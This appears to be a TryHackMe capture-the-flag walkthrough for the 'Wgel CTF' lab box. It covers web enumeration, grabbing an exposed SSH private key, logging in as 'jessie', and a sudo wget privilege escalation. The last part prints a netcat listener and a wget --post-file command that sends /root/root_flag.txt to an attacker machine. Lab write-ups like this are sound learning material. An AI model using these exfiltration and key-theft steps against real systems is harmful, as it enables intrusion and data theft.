TryHackMe <br>
Wgel CTF
---

Let’s start off with running `nmap` anad `Gobuster` to see which ports are open and where we can explore. <br><br>
Looking at the main page it’s a default Apache server page. <br>
I decided to view the source code and towards the bottom of the page there was a comment for “Jessie”. <br>

 ![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/753a5e57-11cd-48dd-ac2f-dee5435ba128)

Visiting `/sitemap` took me to a whole new webpage.. <br>
Next step was to run `Gobuster` on the sitemap webpage and found a promising /.ssh directory. <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/df1e2906-1990-4e74-9ccc-b63d86269545)

Grabbed the `id_rsa` file to my machine with `wget` and will save it for later to try to ssh into the target machine. <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/669d1eef-c3f4-4839-a85d-1f6b36b0bb05)

I also used an exploit for OpenSSH 7.2p for username enumeration. <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/77e4b62b-7dbe-481f-97b8-d56fb660bd69)

“Jessie” is on the list which confirms the source code finding earlier, maybe the key that I found will work as well.. <br>
After getting in to the target machine with: 
```
ssh -i id_rsa jessie@<target_machine_IP>
```
I poked around in the Documents directory to see what I could find and the first flag was available. <br>

```
jessie@CorpOne:~$ cd Documents
jessie@CorpOne:~/Documents$ ls
user_flag.txt
jessie@CorpOne:~/Documents$ cat user_flag.txt
```

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/d1af3448-e81b-4c14-a697-7606a9aec968)


For the second flag, by using the command  `sudo -l` <br>
* That command prints the commands allowed and forbidden the user can run on the current host.  <br>

It showed that we can run the `/usr/bin/wget` without a password prompt. <br>
My friend Google then showed me a “wget priv esc” article that explained how someone could send a file via a “POST” request. <br>
Since I needed the root flag sent to the attacker machine I had to set up a netcat listener on it. <br>

```
nc -lvnp 1337
```

After the listener was set up I executed the following command from the target machine: <br>

```
sudo /usr/bin/wget --post-file=/root/root_flag.txt <attacker_machine_IP:port>
```
And on the attacker machine we got a file with the text displayed, success! <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/93b75502-239b-41dd-b1f8-3fffd2bb1111)









